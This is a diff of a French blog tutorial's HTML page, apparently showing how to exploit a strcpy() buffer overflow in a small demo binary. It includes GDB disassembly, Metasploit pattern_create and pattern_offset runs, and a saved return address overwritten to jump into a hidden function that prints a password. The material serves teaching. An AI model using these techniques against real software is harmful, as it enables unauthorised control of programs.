+   <span class="err">0</span><span class="nf">x080485b6</span> <span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x8048720</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485bb</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">ecx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485bf</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485c3</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485c6</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485cb</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">leave</span>  
+   <span class="err">0</span><span class="nf">x080485cc</span> <span class="o">&lt;+</span><span class="mi">133</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">ret</span>    
+<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
 
-<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
-   <span class="mh">0x080485cd</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x080485ce</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x080485d0</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="k">sub</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
-   <span class="mh">0x080485d3</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485d6</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span> <span class="k">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485d9</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485db</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span> <span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485dd</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="k">jne</span>    <span class="mh">0x80485ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>
-   <span class="mh">0x080485df</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048742</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485e6</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048418</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x080485eb</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span> <span class="k">jmp</span>    <span class="mh">0x80485fd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>
-   <span class="mh">0x080485ed</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485f0</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span> <span class="k">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485f3</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485f5</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485f8</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048547</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
-   <span class="mh">0x080485fd</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;:</span> <span class="k">leave</span>  
-   <span class="mh">0x080485fe</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span> <span class="k">ret</span>    
-<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x080485cd</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x080485ce</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x080485d0</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+   <span class="err">0</span><span class="nf">x080485d3</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485d6</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485d9</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485db</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485dd</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">jne</span>    <span class="mh">0x80485ed</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485df</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x8048742</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485e6</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048418</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485eb</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">jmp</span>    <span class="mh">0x80485fd</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485ed</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485f0</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485f3</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485f5</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485f8</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048547</span> <span class="o">&lt;</span><span class="nv">func</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485fd</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">leave</span>  
+   <span class="err">0</span><span class="nf">x080485fe</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">ret</span>    
+<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>La fonction qui va bien évidemment nous intéresser est func(). Celle-ci contient en effet le buffer overflow avec strcpy(). Celà va nous permettre de retourner dans dummy.</p>
 
@@ -380,7 +362,8 @@ EBP
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>sh <span class="nv">$ </span>msf/tools/pattern_create.rb 24
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7</pre></td></tr></tbody></table></code></pre></figure>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On teste ça sous GDB.</p>
 
@@ -405,14 +388,16 @@ after:    <span class="nv">SEBP</span><span class="o">=</span>0x61413561
    <span class="nv">SEIP</span><span class="o">=</span>0x37614136
 
 Program received signal SIGSEGV, Segmentation fault.
-0x37614136 <span class="k">in</span> ?? <span class="o">()</span></pre></td></tr></tbody></table></code></pre></figure>
+0x37614136 <span class="k">in</span> ?? <span class="o">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Hop on cherche l’offset avec metasploit toujours.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>sh <span class="nv">$ </span>msf/tools/pattern_offset 6Aa7
-20</pre></td></tr></tbody></table></code></pre></figure>
+20
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Pawning :).</p>
 
@@ -429,7 +414,8 @@ before:   <span class="nv">SEBP</span><span class="o">=</span>0xbffff828
    <span class="nv">SEIP</span><span class="o">=</span>0x080485fd
 after:    <span class="nv">SEBP</span><span class="o">=</span>0x4b4e554a
    <span class="nv">SEIP</span><span class="o">=</span>0x08048504
-<span class="o">[</span>password]</pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">[</span>password]
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Et voilà comment en 5 minutes on peut pawn un soft simple ;).</p>
 
@@ -549,6 +535,26 @@ after:    <span class="nv">SEBP</span><span class="o">=</span>0x4b4e554a
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
